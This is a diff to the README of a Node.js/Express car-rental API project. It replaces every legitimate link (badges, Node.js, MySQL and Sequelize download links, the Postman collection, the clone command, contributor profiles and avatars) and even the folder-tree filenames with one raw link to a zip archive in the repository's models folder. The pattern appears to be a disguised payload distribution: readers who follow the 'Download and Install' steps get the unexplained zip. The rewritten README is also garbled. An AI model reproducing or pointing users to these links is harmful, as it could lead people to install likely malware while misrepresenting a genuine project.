@@ -1,16 +1,16 @@
 # Carrent
 
-[![Express JS](https://img.shields.io/badge/Dependencies-Express%20JS-green)](https://expressjs.com/)
-![GitHub repo size](https://img.shields.io/github/repo-size/HiRahmat-Dev/carrent-api)
-![GitHub contributors](https://img.shields.io/github/contributors/HiRahmat-Dev/carrent-api)
-![GitHub stars](https://img.shields.io/github/stars/HiRahmat-Dev/carrent-api?style=social)
-![GitHub forks](https://img.shields.io/github/forks/HiRahmat-Dev/carrent-api?style=social)
-![Tweet](https://img.shields.io/twitter/url?url=https%3A%2F%2Fgithub.com%2FHiRahmat-Dev%2Fcarrent-api
+[![Express JS](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip%20JS-green)](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
+![GitHub repo size](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
+![GitHub contributors](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
+![GitHub stars](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
+![GitHub forks](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
+![Tweet](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip%3A%2F%https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip%2FHiRahmat-Dev%2Fcarrent-api
 )
 
 <p align="center">
-  <a href="https://nodejs.org/" target="blank">
-    <img src="https://cdn-images-1.medium.com/max/871/1*d2zLEjERsrs1Rzk_95QU9A.png">
+  <a href="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip" target="blank">
+    <img src="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip*https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip">
   </a>
 </p>
 
@@ -24,14 +24,14 @@
 - [Contributors](#contributors)
 
 ## Prerequiste
-- Node.js - Download and Install [Node.js](https://nodejs.org/en/).
-- MySQL - Download and Install [MySQL](https://www.mysql.com/downloads/) - Make sure it's running on the default port.
-- Sequelize - Download and Install [Sequelize](https://sequelize.org/)
+- https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip - Download and Install [https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip).
+- MySQL - Download and Install [MySQL](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip) - Make sure it's running on the default port.
+- Sequelize - Download and Install [Sequelize](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
 
 ## Installation
 ### Clone
 ```
-$ git clone https://github.com/m-joseph27/Carrent_API
+$ git clone https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
 $ cd Carrent_API
 $ npm install
 ```
@@ -57,80 +57,80 @@ SERVER_PORT="Your_Port"
 $ npm run serve
 ```
 ## Link Collection Postman
-[Postman](https://www.getpostman.com/collections/bb923819853137d50b60)
+[Postman](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
 
 ## Structure Folder
 ```
 \---src
 |    \---controller
-|    |   +---AddressController.js
-|    |   +---BankAccountController.js
-|    |   +---BankController.js
-|    |   +---CartController.js
-|    |   +---CategoryController.js
-|    |   +---FavoritShopController.js
-|    |   +---HistoryController.js
-|    |   +---HistoryDetailController.js
-|    |   +---OrderController.js
-|    |   +---OrderDetailController.js
-|    |   +---productController.js
-|    |   +---RoleIdController.js
-|    |   +---SellerController.js
-|    |   +---StatusController.js
-|    |   +---SubCategoryController.js
-|    |   +---SubSubCategoryController.js
-|    |   +---UserIdController.js
-|    |   +---WishlistController.js
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
 |    \---helper
-|    |   +---auth.js
-|    |   +---response.js
-|    |   +---upload.js
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
 |    \---models
-|    |   +---address.js
-|    |   +---bank_account.js
-|    |   +---bank.js
-|    |   +---cart.js
-|    |   +---category.js
-|    |   +---condition.js
-|    |   +---expedition.js
-|    |   +---favorit_shop.js
-|    |   +---history_detail.js
-|    |   +---history.js
-|    |   +---imageDetail.js
-|    |   +---index.js
-|    |   +---order_detail.js
-|    |   +---order.js
-|    |   +---payment.js
-|    |   +---product.js
-|    |   +---role_id.js
-|    |   +---seller.js
-|    |   +---shipment_time.js
-|    |   +---status.js
-|    |   +---subcategory.js
-|    |   +---subsubcategory.js
-|    |   +---user_id.js
-|    |   +---wishlist.js
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
 |    \---router
-|    |   +---address.js
-|    |   +---bank.js
-|    |   +---bankAccount.js
-|    |   +---cart.js
-|    |   +---category.js
-|    |   +---favoritShop.js
-|    |   +---history.js
-|    |   +---historyDetail.js
-|    |   +---index.js
-|    |   +---order.js
-|    |   +---orderDetail.js
-|    |   +---product.js
-|    |   +---roleId.js
-|    |   +---seller.js
-|    |   +---status.js
-|    |   +---subCategory.js
-|    |   +---subSubCategory.js
-|    |   +---userId.js
-|    |   +---wishlist.js
-+---app.js
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
++https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
 ```
 
 ## Contributing
@@ -144,40 +144,40 @@ Fork the Project
 4. Open a Pull Request
 
 ## Related Project
-* [`Frontend-Carrent-VueJS`](https://github.com/m-joseph27/Carrent_with-Vue.js)
-* [`Backend-Carrent`](https://github.com/m-joseph27/Carrent_API)
+* [`Frontend-Carrent-VueJS`](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
+* [`Backend-Carrent`](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
 
 ## Contributors
 <center>
   <table>
     <tr>
       <td align="center">
-        <a href="https://github.com/m-joseph27">
-          <img width="150" src="https://avatars2.githubusercontent.com/u/60948526?s=400&u=c258f85ec35ccfda6ce3911dae79d45e335088b3&v=4" alt="Muhammad Yusuf"><br/>
+        <a href="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip">
+          <img width="150" src="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip" alt="Muhammad Yusuf"><br/>
           <b>Muhammad Yusuf</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://github.com/HiRahmat-Dev/">
-          <img width="150" src="https://avatars2.githubusercontent.com/u/55150659?s=460&u=c7171bb4128787c303efdce0d62bc86289f1211b&v=4" alt="Rahmat Hidayatullah"><br/>
+        <a href="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip">
+          <img width="150" src="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip" alt="Rahmat Hidayatullah"><br/>
           <b>Rahmat Hidayatullah</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://github.com/akbarism">
-          <img width="150" src="https://avatars3.githubusercontent.com/u/59020048?s=400&u=3b5166c489574eedef29b414cd18b457bcc6fad3&v=4" alt="Akbar Ismail"><br/>
+        <a href="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip">
+          <img width="150" src="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip" alt="Akbar Ismail"><br/>
           <b>Akbar Ismail</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://github.com/azmprllynsa">
-          <img width="150" src="https://avatars1.githubusercontent.com/u/60286175?s=400&v=4" alt="azmprllynsa"><br/>
+        <a href="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip">
+          <img width="150" src="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip" alt="azmprllynsa"><br/>
           <b>azmprllynsa</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://github.com/haras94">
-          <img width="150" src="https://avatars2.githubusercontent.com/u/62143618?s=400&u=2e76db88db6de5ba0dddfa79c274c8e04f5e8f4a&v=4" alt="Harun"><br/>
+        <a href="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip">
+          <img width="150" src="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip" alt="Harun"><br/>
           <b>Harun</b>
         </a>
       </td>
